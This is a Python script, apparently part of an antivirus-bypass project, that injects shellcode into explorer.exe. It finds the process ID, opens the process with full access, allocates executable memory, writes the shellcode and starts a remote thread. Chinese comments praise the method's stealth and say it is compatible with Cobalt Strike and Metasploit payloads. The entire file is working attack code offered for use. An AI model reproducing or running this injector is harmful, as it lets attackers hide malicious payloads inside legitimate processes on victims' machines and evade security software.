import time
import ctypes
import sys
import subprocess

info="windows提供了一系列API可以实现进程注入功能，向目标进程注入shellcode后，shellcode在目标进程中运行，配合删除源文件和shellcode网络分离可以做到很好的隐蔽性，但容易被杀软查杀"


def findPid(proName='explorer'):
    cmd=f"tasklist | findstr {proName}"
    out=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
    infos=out.stdout.read().splitlines()
    pidlist=[]
    if len(infos) >=1:
        for i in infos:
            pid=i.split()[1]
            if pid not in pidlist:
                pidlist.append(int(pid))
        return pidlist
    else:
        return -1

def main(buf,process='explorer.exe'):
    pid=findPid(process)[0]
    print('???',pid)
    if not pid:
        print('no pid find')
        return
    if isinstance(buf,str):
        buf=buf.encode('latin1')    #确保buf是unicode，此处是为了兼容CS和MSF
    PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
    h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if h_process:
        shellcode = bytearray(buf)
        arg_address = ctypes.windll.kernel32.VirtualAllocEx(h_process,0,len(shellcode),0x3000,0x40)
        shellcode = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
        ctypes.windll.kernel32.WriteProcessMemory(h_process, arg_address, shellcode,len(shellcode), 0)
        if not ctypes.windll.kernel32.CreateRemoteThread(h_process,None,0,arg_address,None,0,ctypes.byref(ctypes.c_ulong(0))):
            print("create thread false")
            sys.exit()
    else:
        print("open the process false")
        sys.exit()

    ctypes.windll.kernel32.CloseHandle(h_process)
    time.sleep(100)
    sys.exit(0)


if __name__ == '__main__':
    import shellcoder
    buf=shellcoder.main('','',r"D:\BaiduSyncdisk\dyb\a_penetration\kali_tools\my_project\project\BypassAV\StormBypassAV\config\payloadJQuery.py",'','',True)
    print('buf:\n',buf)

    if not buf:
        sys.exit()
    else:

        main(buf)